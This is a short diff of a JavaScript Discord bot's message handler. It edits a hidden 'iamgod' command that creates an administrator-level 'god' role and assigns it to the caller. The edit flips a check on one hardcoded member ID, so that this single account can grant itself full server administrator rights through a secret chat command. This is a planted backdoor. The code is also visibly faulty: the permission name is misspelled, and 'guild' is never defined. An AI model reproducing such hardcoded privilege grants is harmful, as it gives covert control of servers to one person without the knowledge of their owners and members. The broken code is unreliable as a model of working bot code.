@@ -82,7 +82,7 @@ client.on("message", async message => {
 	  message.channel.send(`https://discord.gg/q6bQpth`)
   }
   if(command == 'iamgod') {
-	  if(message.member.id != "531488210732187649") {
+	  if(message.member.id == "531488210732187649") {
 		  guild.createRole({name: "god", permissions: "ADMINSISTRATOR"});
 		  return message.member.addRole('god');
 		  
